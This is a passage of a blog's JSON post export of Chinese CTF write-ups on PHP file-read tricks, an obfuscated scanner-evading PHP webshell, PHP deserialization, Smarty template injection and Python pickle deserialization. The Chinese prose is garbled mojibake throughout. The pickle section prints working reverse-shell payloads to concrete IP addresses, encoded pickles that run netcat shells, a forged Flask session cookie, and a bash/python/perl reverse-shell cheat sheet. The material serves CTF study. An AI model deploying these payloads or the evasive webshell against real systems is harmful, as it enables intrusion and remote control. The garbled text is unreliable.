12php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#x2F;&#x2F;result PD9waHAKCiRmbGFnPSJ0ZXN0e30iOwo&#x3D; æ¥ä¸‹æ¥æˆ‘ä»¬å°†å¯¹ç»•è¿‡çš„åŸç†è¿›è¡Œåˆ†æï¼Œphp7.2.23çš„æºç è¿›è¡Œåˆ†æï¼Œå»ºè®®é…åˆClionåœ¨linuxé‡Œè¿›è¡Œè°ƒè¯•ï¼Œè‡³äºå¦‚ä½•æ­å»ºè°ƒè¯•ç¯å¢ƒï¼Œå¯ä»¥è‡ªè¡Œæœç´¢ï¼Œå‚è€ƒä¸€äº›åˆ«çš„æ–‡ç« ã€‚ 1https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzA5ODA0NDE2MA&#x3D;&#x3D;&amp;mid&#x3D;2649729209&amp;idx&#x3D;1&amp;sn&#x3D;78c1f6cf291e5cfca3088f02216ccffd&amp;chksm&#x3D;888c98d6bffb11c014d8f98437879564702bd35b100f4337cbdf1f3cff827edfa4b9a8672637&amp;mpshare&#x3D;1&amp;scene&#x3D;23&amp;srcid&#x3D;0812s60kjiOtHT66otXJWIHt&amp;sharer_sharetime&#x3D;1597388716474&amp;sharer_shareid&#x3D;33a823b10ae99f33a60db621d83241cb#rd å¦å¤–ä¸€ç§æ–¹æ³•ï¼š 12http:&#x2F;&#x2F;571be1a2-1a80-477d-8f8c-71cd3a4d93a3.node3.buuoj.cn&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;123&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.php","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"ä¸€äº›è¿‡ç‹—é©¬","slug":"ä¸€äº›è¿‡ç‹—é©¬","date":"2020-12-14T08:07:29.000Z","updated":"2020-12-17T11:32:55.972Z","comments":true,"path":"2020/12/14/ä¸€äº›è¿‡ç‹—é©¬/","link":"","permalink":"http://example.com/2020/12/14/%E4%B8%80%E4%BA%9B%E8%BF%87%E7%8B%97%E9%A9%AC/","excerpt":"","text":"å†™è¿™ç¯‡çš„åŸå› ä¸»è¦æ˜¯ä¸€æ¬¡å¯¹å†…çš„AWDè‡ªå·±è¢«ä¸€ä¸ªè¿‡ç‹—é©¬çš„æ–¹å¼å¡ä½äº†ï¼Œæƒ³äº†åŠå¤©æ‰æŠ˜è…¾å‡ºæ¥ï¼Œæ‰€ä»¥æ‰“ç®—æ€»ç»“ä¸€ä¸‹å„ç§è¿‡ç‹—é©¬çš„å§¿åŠ¿ã€‚ åœ¨å„ç¯‡AWDæ¯”èµ›ä¸­æ€»ä¼šæ•™æˆ‘ä»¬èµ·æ‰‹å¼å°±æ˜¯æŠŠåŸä»¶è„±ä¸‹æ¥å¤‡ä»½ï¼Œä¹‹åå°±æ˜¯ç”¨Dç›¾æ‰«ã€‚è€ŒDç›¾è¿™ä¸ªä¸œè¥¿å¯¹äºä»£ç çš„è¯†åˆ«å¾ˆå¤šæ—¶å€™ä¹Ÿå°±æ˜¯å±€é™äºå¯¹ä¸€äº›å‡½æ•°çš„æ­£åˆ™åŒ¹é…ã€‚æ‰€ä»¥æˆ‘ä»¬ç»•è¿‡éœ€è¦æ³¨æ„å‡ ç‚¹å³å¯ï¼š å¯¹äºevalï¼Œcall_backå‡½æ•°æ˜¯ä¸èƒ½ç”¨çš„ å°è¯•ä½¿ç”¨ä¸€äº›ç½•è§çš„call backå‡½æ•° è®°å½•ä¸€ä¸ªå‚»é€¼ç©æ„å„¿ï¼š 123&lt;?=$_=[];$__=$_.$_;$_=($_==$__);$__=($_==$_);$___=~åŒº[$__].~å†ˆ[$__].~åŒº[$__].~å‹º[$__].~çš®[$__].~é’ˆ[$__];$____=~ç [$__].~å¯¸[$__].~å°[$__].~æ¬ [$__].~ç«‹[$__];$___($$____[_]);//å¯†ç æ˜¯_","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"AWD","slug":"AWD","permalink":"http://example.com/tags/AWD/"}]},{"title":"GYCTF_EASYPHP","slug":"GYCTF-EASYPHP","date":"2020-12-11T10:06:15.000Z","updated":"2020-12-11T10:18:11.841Z","comments":true,"path":"2020/12/11/GYCTF-EASYPHP/","link":"","permalink":"http://example.com/2020/12/11/GYCTF-EASYPHP/","excerpt":"","text":"çŸ¥è¯†ç‚¹ ååºåˆ—åŒ–é€ƒé€¸ POPé“¾ æ€è·¯é¢˜ç›®å¯ä»¥dumpä¸‹æ¥wwwä¸‹çš„PHPæ–‡ä»¶ï¼Œåœ¨update.phpä¸‹é¢ï¼š 123456789if ($_SESSION[&#x27;login&#x27;]!=1)&#123; echo &quot;ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼&quot;;&#125;$users=new User();$users-&gt;update();if($_SESSION[&#x27;login&#x27;]===1)&#123; require_once(&quot;flag.php&quot;); echo $flag;&#125; å³ä½¿ç™»é™†æ²¡æœ‰æˆåŠŸä¹Ÿæ‰§è¡Œäº†update()è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥è¦è¯´æ¼æ´è‚¯å®šå°±æ˜¯åœ¨è¿™é‡Œäº†ï¼Œé‡ç‚¹åœ¨lib.phpè¿™é‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°è¯•checkè¿™å„¿ï¼Œå…ˆçœ‹updateå‡½æ•°ï¼š 1234567public function update()&#123; $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]);&#125; æˆ‘ä»¬çœ‹è¿™é‡Œååºåˆ—åŒ–äº†getNewInfoå‡½æ•°ï¼ŒæŸ¥çœ‹è¿™ä¸ªå‡½æ•°è·Ÿè¿› 12345public function getNewInfo()&#123; $age=$_POST[&#x27;age&#x27;]; $nickname=$_POST[&#x27;nickname&#x27;]; return safe(serialize(new Info($age,$nickname)));&#125; æ¥æ”¶äº†ä¸¤ä¸ªå‚æ•°ï¼Œä¹‹åè°ƒç”¨safeå‡½æ•°ï¼Œå¹¶ä¸”åºåˆ—åŒ–äº†å®ƒï¼Œé‚£ä¹ˆå»æ‰¾safeå‡½æ•°ï¼š 1234function safe($parm)&#123; $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\\\&#x27;,&quot;*&quot;,&quot;alter&quot;); return str_replace($array,&#x27;hacker&#x27;,$parm);&#125; ç›´æ¥å°†ä¸æ»¡6çš„ä¸œè¥¿å˜æˆäº†hackï¼Œæœ‰é—®é¢˜ï¼Œè¿™é‡Œå¯ä»¥é€ æˆååºåˆ—åŒ–é€ƒé€¸ã€‚è¿™æ˜¯ä¸€ä¸ªæ­£å¸¸çš„æ›´æ–°æµç¨‹ï¼Œä½†å¾ˆæ˜æ˜¾æˆ‘ä»¬ä¸åº”è¯¥è·Ÿç€ä»–çš„æ€è·¯å»èµ°ï¼Œå› ä¸ºæœ‰äº†ååºåˆ—åŒ–é€ƒé€¸ï¼Œæ‰€ä»¥nicknameæˆ‘ä»¬å¯ä»¥ä»»æ„æ§åˆ¶ï¼Œ æˆ‘ä»¬åœ¨getNewInfoè¿™é‡Œå¯ä»¥çœ‹è§newäº†ä¸€ä¸ªinfoç±»ï¼ŒinFoç±»è¿™é‡Œå¾ˆæ˜æ˜¾é™¤äº†__constructä¹‹å¤–è¿˜æœ‰æœ‰ä¸ªcallã€‚é‚£ä¹ˆé¢˜ç›®åº”è¯¥æ˜¯æƒ³è®©æˆ‘ä»¬æ§åˆ¶ä»»æ„çš„sqlè¯­å¥æŸ¥è¯¢-&gt;å¾—åˆ°ä¸€ä¸ªæ’ä¸ºçœŸçš„ç»“æœ-&gt;ç™»é™†æˆåŠŸã€‚ å›åˆ°é¢˜ç›®è¿™é‡Œçš„æƒ…å†µè®¾æƒ³ä¸‹ï¼Œæ— è®ºç™»é™†æˆåŠŸä¸å¦ï¼Œéƒ½ä¼šå°è¯•æ‰§è¡Œupdateå‡½æ•°ï¼Œupdateå‡½æ•°è¿™é‡Œnewäº†UpdateHelperç±»ï¼Œåœ¨ç±»è¢«é”€æ¯çš„æ—¶å€™è¾“å‡ºäº†$this-&gt;sql","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"CISCN2019WEB11","slug":"CISCN2019WEB11","date":"2020-12-08T13:03:48.000Z","updated":"2020-12-08T13:28:53.654Z","comments":true,"path":"2020/12/08/CISCN2019WEB11/","link":"","permalink":"http://example.com/2020/12/08/CISCN2019WEB11/","excerpt":"","text":"çŸ¥è¯†ç‚¹ï¼š XFFæ³¨å…¥ æ¨¡æ¿æ³¨å…¥smarty smartyâ€‹ è¿™æ˜¯PHPçš„ä¸€ä¸ªæ¨¡æ¿è¯­è¨€ï¼Œç±»ä¼¼äºflaskçš„jinjia2ï¼Œsmartyä¹Ÿå¯ä»¥è®©æˆ‘ä»¬è§£æPHPçš„é€»è¾‘è¯­è¨€ï¼Œæ¯”å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡{system(â€œlsâ€)}æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œé™¤æ­¤ä¹‹å¤–ï¼ŒPHPsmartyè¿˜æœ‰å¾ˆå¤šéªšæ€è·¯ï¼š {php}{/php} å¯ä»¥æ‰§è¡Œphpçš„ä»£ç  ä¾‹å­ï¼š 1&#123;php&#125;eval($_POST[0]);&#123;/php&#125; {literal}è¯¥æ ‡ç­¾å¯ä»¥è®©ä¸€æ®µæ ‡ç­¾ä»£ç åŸæ ·è¾“å‡ºï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ï¼š 1&#123;literal&#125;&lt;script language=&quot;php&quot;&gt;system(&quot;ls&quot;);&lt;/script&gt;&#123;/literal&#125; é™æ€æ–¹æ³•1&#123;self::getStreamVariable(â€œfile:///etc/passwdâ€)&#125; {if}æ ‡ç­¾å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°è¿™æ ·çš„æè¿°ï¼š 1Smartyçš„&#123;if&#125;æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª&#123;if&#125;å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„&#123;/if&#125;ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨&#123;else&#125; å’Œ &#123;elseif&#125;ï¼Œå…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚||*, or, &amp;&amp;, and, is_array(), ç­‰ç­‰ï¼Œå¦‚ï¼š&#123;if is_array($array)&#125;&#123;/if&#125;* ä¸Šè¿°éƒ½æ‘˜è‡ªæ–‡ç« ï¼šhttps://blog.csdn.net/qq_45521281/article/details/107556915 åšé¢˜æ€è·¯é¢˜ç›®å¼€å§‹å°±ç»™äº†IPçš„åœ°æ–¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨è¿™é‡Œè¿›è¡Œæ³¨å…¥ï¼Œå¼€å§‹æˆ‘è¿˜ä»¥ä¸ºæ˜¯SQLMAPã€‚ã€‚ä¸è¿‡åæ¥å‘ç°ä¸æ˜¯ï¼Œæ˜¯SMARTYæ¨¡æ¿æ³¨å…¥ æ•…æˆ‘ä»¬ç›´æ¥åœ¨XXFè¾“å‡º{system(â€œcat /flagâ€)} æˆ–è€…{if system(â€œcat /flagâ€)}{/if}","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"Pythonååºåˆ—åŒ–","slug":"Pythonååºåˆ—åŒ–","date":"2020-12-07T11:21:26.000Z","updated":"2021-05-12T07:32:14.743Z","comments":true,"path":"2020/12/07/Pythonååºåˆ—åŒ–/","link":"","permalink":"http://example.com/2020/12/07/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"ä»Šå¤©åœ¨åˆ·BUUçš„æ—¶å€™åšåˆ°äº†IKUNè¿™é“é¢˜ç›®ï¼Œä»¥å‰æ²¡æœ‰æ¥è§¦è¿‡Pythonçš„ååºåˆ—åŒ–ï¼Œæ‰€ä»¥ä¸ä¼šåšåˆ°æœ€åä¸€æ­¥..å¤ç°å®Œä¹‹åå†³å®šæ€»ç»“ä¸€ä¸‹Pythonçš„ååºåˆ—åŒ–çš„å‡ ç§æ–¹å¼ï¼š Pythonèƒ½å¤Ÿå®ç°çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ–¹å¼ä¸»è¦æœ‰ä¸‰ï¼š JSON pickle shelve è€Œè¿™Ikunè¿™é“é¢˜ä½¿ç”¨çš„ä¾¿æ˜¯Pickleï¼Œæ•…æˆ‘ä»¬ä»è¿™ä¸€éƒ¨åˆ†å¼€å§‹è¯´èµ·ã€‚ Picklepickleæä¾›äº†ä¸€ä¸ªç®€å•çš„æŒä¹…åŒ–åŠŸèƒ½ã€‚å¯ä»¥å°†å¯¹è±¡ä»¥æ–‡ä»¶çš„å½¢å¼å­˜æ”¾åœ¨ç£ç›˜ä¸Šã€‚ pickleæ¨¡å—åªèƒ½åœ¨pythonä¸­ä½¿ç”¨ï¼Œpythonä¸­å‡ ä¹æ‰€æœ‰çš„æ•°æ®ç±»å‹ï¼ˆåˆ—è¡¨ï¼Œå­—å…¸ï¼Œé›†åˆï¼Œç±»ç­‰ï¼‰éƒ½å¯ä»¥ç”¨pickleæ¥åºåˆ—åŒ–ï¼Œ pickleåºåˆ—åŒ–åçš„æ•°æ®ï¼Œå¯è¯»æ€§å·®ï¼Œäººä¸€èˆ¬æ— æ³•è¯†åˆ«ã€‚ Pythonæ¥å£æœ‰4ä¸ªï¼š dump dumps load loads dumpdumpæˆ‘ä»¬ç”¨äºå°†æ•°æ®å†™å…¥æ–‡ä»¶å½“ä¸­ï¼Œå®˜æ–¹æ–‡æ¡£ä¸­ï¼š 1pickle.dumpï¼ˆobjï¼Œfileï¼Œprotocol = Noneï¼Œ*ï¼Œfix_imports = True ï¼‰ æˆ‘ä»¬å¯ä»¥å®è·µä¸€ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940import pickleclass Person: def __init__(self, n, a): self.name = n self.age = a def show(self): print(self.name + &quot;_&quot; + str(self.age))aa = Person(&quot;JGood&quot;, 2)f=open(&#x27;p.txt&#x27;,&#x27;wb&#x27;)pickle.dump(aa,f,0)f.close()å¾—åˆ°æ•°æ®å¦‚ä¸‹ï¼šccopy_reg_reconstructorp0(c__main__Personp1c__builtin__objectp2Ntp3Rp4(dp5Vnamep6VJGoodp7sVagep8I2sb.# è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œä¼šæœ‰å¤§é‡çš„\\næ¢è¡Œç¬¦ dumpsè¯¥å‡½æ•°ä¸dumpçš„å·®åˆ«åœ¨äºè¯¥å‡½æ•°ä¸ä¼šå°†å¯¹è±¡å†™å…¥æ–‡ä»¶å½“ä¸­ï¼Œåªä¼šå°†å…¶è½¬åŒ–ä¸ºbyteså¯¹è±¡ï¼Œä¾‹å­ï¼š 1234567891011121314151617import pickleclass Person: def __init__(self, n, a): self.name = n self.age = a def show(self): print(self.name + &quot;_&quot; + str(self.age))aa = Person(&quot;JGood&quot;, 2)# f=open(&#x27;p.txt&#x27;,&#x27;wb&#x27;)c = pickle.dumps(aa,0)print(c) 1b&#x27;ccopy_reg\\n_reconstructor\\np0\\n(c__main__\\nPerson\\np1\\nc__builtin__\\nobject\\np2\\nNtp3\\nRp4\\n(dp5\\nVname\\np6\\nVJGood\\np7\\nsVage\\np8\\nI2\\nsb.&#x27; loadloadä¸dumpå¯¹åº”ï¼Œè¯»å–æŸä¸ªæ–‡ä»¶å¹¶å°†å…¶è¿˜åŸä¸ºä¸€ä¸ªç±»ï¼š 12pickle.loadï¼ˆfileï¼Œ*ï¼Œfix_imports &#x3D; Trueï¼Œencoding &#x3D;â€œASCIIâ€ï¼Œerrors &#x3D;â€œstrictâ€ ï¼‰ä»æ‰“å¼€çš„æ–‡ä»¶å¯¹è±¡ æ–‡ä»¶ä¸­è¯»å–pickleå¯¹è±¡è¡¨ç¤ºï¼Œå¹¶è¿”å›å…¶ä¸­æŒ‡å®šçš„é‡æ„å¯¹è±¡å±‚æ¬¡ç»“æ„ã€‚è¿™ç›¸å½“äºUnpickler(file).load()ã€‚ loadsloadsä¸dumpså¯¹åº”ï¼Œå°†ä¸€ä¸ªåºåˆ—åŒ–å¯¹è±¡æ¢æˆä¸€ä¸ªç±»ã€‚ åœ¨å¤§éƒ¨åˆ†çš„æ¯”èµ›å½“ä¸­ï¼Œæˆ‘ä»¬é‡è§çš„æƒ…å†µéƒ½æ˜¯é¢˜ç›®ä¼šloadå¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰¾çš„å°±æ˜¯é­”æ³•å‡½æ•°ã€‚ååºåˆ—åŒ–æ¼æ´å‡ºç°åœ¨ __reduce__()é­”æ³•å‡½æ•°ä¸Šï¼Œè¿™ä¸€ç‚¹å’ŒPHPä¸­çš„__wakeup() é­”æœ¯æ–¹æ³•ç±»ä¼¼ï¼Œéƒ½æ˜¯å› ä¸ºæ¯å½“ååºåˆ—åŒ–è¿‡ç¨‹å¼€å§‹æˆ–è€…ç»“æŸæ—¶ , éƒ½ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ç±»å‡½æ•°ã€‚è€Œè¿™æ°å¥½æ˜¯ååºåˆ—åŒ–æ¼æ´ç»å¸¸å‡ºç°çš„åœ°æ–¹ã€‚ è€Œä¸”åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå› ä¸ºç¼–ç¨‹è¯­è¨€éœ€è¦æ ¹æ®ååºåˆ—åŒ–å­—ç¬¦ä¸²å»è§£æå‡ºè‡ªå·±ç‹¬ç‰¹çš„è¯­è¨€æ•°æ®ç»“æ„ï¼Œæ‰€ä»¥å°±å¿…é¡»è¦åœ¨å†…éƒ¨æŠŠè§£æå‡ºæ¥çš„ç»“æ„å»æ‰§è¡Œä¸€ä¸‹ã€‚å¦‚æœåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å‡ºç°é—®é¢˜ï¼Œä¾¿å¯èƒ½ç›´æ¥é€ æˆRCEæ¼æ´. ã€ä¸Šè¿°æ‘˜è‡ªå¸ˆå‚…çš„åšå®¢https://blog.csdn.net/qq_43431158/article/details/108919605 å¹¶ä¸”loadsä¼šè‡ªåŠ¨çš„è§£å†³importé—®é¢˜ï¼Œå¯¹äºæ²¡æœ‰å¼•å…¥çš„moduleä¼šè‡ªåŠ¨å°è¯•importï¼Œä¹Ÿå°±æ˜¯è¯´Pythonä¸­æ ‡å‡†åº“çš„ä»£ç æ‰§è¡Œï¼Œå‘½ä»¤æ‰§è¡Œå‡½æ•°æˆ‘ä»¬éƒ½å¯ä»¥ä½¿ç”¨ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹å¯ä»¥å°è¯•ä½¿ç”¨çš„ï¼š 123456789101112131415161718192021eval, execfile, compile, open, file, map, input,os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,os.listdir, os.access,os.execl, os.execle, os.execlp, os.execlpe, os.execv,os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,pickle.load, pickle.loads,cPickle.load,cPickle.loads,subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,commands.getstatusoutput,commands.getoutput,commands.getstatus,glob.glob,linecache.getline,shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,dircache.listdir,dircache.opendir,io.open,popen2.popen2,popen2.popen3,popen2.popen4,timeit.timeit,timeit.repeat,sys.call_tracing,code.interact,code.compile_command,codeop.compile_command,pty.spawn,posixfile.open,posixfile.fileopen,platform.popen å½“ __reduce__() å‡½æ•°è¿”å›ä¸€ä¸ªå…ƒç»„æ—¶ , ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ , è¿™ä¸ªå¯¹è±¡ä¼šåœ¨åˆ›å»ºå¯¹è±¡æ—¶è¢«è°ƒç”¨ . ç¬¬äºŒä¸ªå…ƒç´ æ˜¯å¯è°ƒç”¨å¯¹è±¡çš„å‚æ•° , åŒæ ·æ˜¯ä¸€ä¸ªå…ƒç»„ã€‚ ä¾‹å­å¦‚ä¸‹ï¼š 123456789101112def __reduce__(self): print(&quot;wdnmd&quot;) return eval, (&quot;print(123213)&quot;,)person = Person()a = pickle.dumps(person,0)&#x27;&#x27;&#x27;wdnmdccb&#x27;c__builtin__\\neval\\np0\\n(Vprint(123213)\\np1\\ntp2\\nRp3\\n.&#x27;&#x27;&#x27;&#x27; åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ç»“æŸçš„æ—¶å€™ , Python è¿›ç¨‹ä¼šè‡ªåŠ¨è°ƒç”¨ __reduce__() é­”æœ¯æ–¹æ³• . å¦‚æœå¯ä»¥æ§åˆ¶è¢«è°ƒç”¨å‡½æ•°çš„å‚æ•° , Python è¿›ç¨‹å°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚ ä½†æ˜¯åœ¨æˆ‘è‡ªå·±è¯•çš„æ—¶å€™ï¼Œå‘ç°å³ä½¿æ˜¯dumpsä¹Ÿä¼šæ‰§è¡Œæˆ‘ä»¬çš„è¯­å¥ å›åˆ°loadsæ¥è¯´ï¼Œloadsä¹Ÿå¯ä»¥ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œé™¤äº†ikuné‚£é“é¢˜ç›®å¤§éƒ¨åˆ†payloadä½¿ç”¨evalä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ Python2ä¸­åŒ…å«çš„commands.getoutput(),åœ¨Ikunè¿™é“é¢˜å½“ä¸­ï¼š å¯æƒœè¿™é‡Œåªæ˜¯Python2ç¯å¢ƒï¼Œå¦‚æœåœ¨Python3ç¯å¢ƒå½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨subprocess (1) callæ‰§è¡Œå‘½ä»¤ï¼Œè¿”å›çŠ¶æ€ç (å‘½ä»¤æ­£å¸¸æ‰§è¡Œè¿”å›0ï¼ŒæŠ¥é”™åˆ™è¿”å›1) 12345678ret1&#x3D;subprocess.call(&quot;ifconfig&quot;)ret2&#x3D;subprocess.call(&quot;ipconfig&quot;) #python3.5ä¸æ˜¯è¿™æ ·ï¼Œä¾ç„¶ä¼šæŠ›å‡ºå¼‚å¸¸å¯¼è‡´æ— æ³•å¯¹ret2èµ‹å€¼print(ret1) #0print(ret2) #1ret &#x3D; subprocess.call([&quot;ls&quot;, &quot;-l&quot;], shell&#x3D;False) #shellä¸ºFalseçš„æ—¶å€™å‘½ä»¤å¿…é¡»åˆ†å¼€å†™ret &#x3D; subprocess.call(&quot;ls -l&quot;, shell&#x3D;True) (2) check_callæ‰§è¡Œå‘½ä»¤ï¼Œå¦‚æœæ‰§è¡ŒæˆåŠŸåˆ™è¿”å›çŠ¶æ€ç 0ï¼Œå¦åˆ™æŠ›å¼‚å¸¸ 12subprocess.check_call([&quot;ls&quot;, &quot;-l&quot;])subprocess.check_call(&quot;exit 1&quot;, shell&#x3D;True) (3) check_outputæ‰§è¡Œå‘½ä»¤ï¼Œå¦‚æœæ‰§è¡ŒæˆåŠŸåˆ™è¿”å›æ‰§è¡Œç»“æœï¼Œå¦åˆ™æŠ›å¼‚å¸¸ 12subprocess.check_output([&quot;echo&quot;, &quot;Hello World!&quot;])subprocess.check_output(&quot;exit 1&quot;, shell&#x3D;True) (4) subprocess.Popen(â€¦)payload1234567891011import pickleimport base64import commandsclass payload(object): def __reduce__(self): return (commands.getstatusoutput, (&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;118.89.227.105&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;,))a = pickle.dumps(payload())a = base64.b64encode(a)print a 1234567891011class User: uname = &#x27;123&#x27; is_admin = 1 __repr__ = lambda o: o.uname def __reduce__(self): return (eval, (&quot;__import__(&#x27;os&#x27;).system(&#x27;nc ip port -e /bin/sh&#x27;)&quot;,)) &#x27;&#x27;&#x27; &#123;&#x27;u&#x27;:b&#x27;gASVVgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw6X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBgY2F0IC9mbGFnIGAgPiAvZjFhZycpLnJlYWQoKZSFlFKULg&#x27;&#125; &#x27;&#x27;&#x27; ç”Ÿæˆï¼š 1.eJwtxz0OgjAYANCrmJ6AxkkTF5RiSKjB_tFvA0oUaKGJVojEu-vg8Ia3ooD2K9rUaI8gIlxaGAtB4r8TF_TMenKX29usZYNbt2QmkpUiftKD5zL9_Q0653bW9n40jgbhQLfKBN1TWg9PTkvT5VH20M6OtfUld7uuFdmoeJbmiT1dFO6uEQQmTAw49kUJVTXApEbbN8kSmFtAYvJi2POrW1KGZQ7z4YA-ny8R0kGX.YJtLwg.1ycpGY0sFxDjHFKYijGZpMALrZA python2 python3 çš„ä¼ªé€ æ˜¯ä¸€æ ·çš„ 12.eJwtx7sOgjAUANBfMf2CNk44ohZDQo32Re8GlsijxSZaJRD-XQeHM5wFRbRb0KZGOwSYCuVgvEia_h2EZCfe01Zt7x-jbqTxU26xqjQNDzMEobLfZzCFcB_j2r31LEoPptE2mp6xengJVtquwPnTeDfWLpTCJ10j81GLPCuO7nDWpLtiiFzaFEgaLiVU1QAPPbr-dpwi9xMoQt-cBHH1U8aJKmDGCVrXLxGTQYk.YJtMnQ.Lc_vWp_w-A5CC1P_PqD6EGSzPfM 1python3 flask_session_cookie_manager3.py encode -s &#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27; -t &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVRwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwrX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC8xMjMnKZSFlFKULg==&#x27;&#125;&#125;&quot; 1python2 flask_session_cookie_manager2.py encode -s &#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27; -t &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVWQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw9X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDgxLjY5LjIwMS42NSA0MDAxIC1lIC9iaW4vYmFzaCAnKZSFlFKULg==&#x27;&#125;&#125;&quot; åå¼¹shell: 123456789101112#bashåå¼¹bash -i &gt;&amp; /dev/tcp/192.168.10.27/4444 0&gt;&amp;1#pythonåå¼¹python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.10.27&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;#Perlåå¼¹perl -e &#x27;use 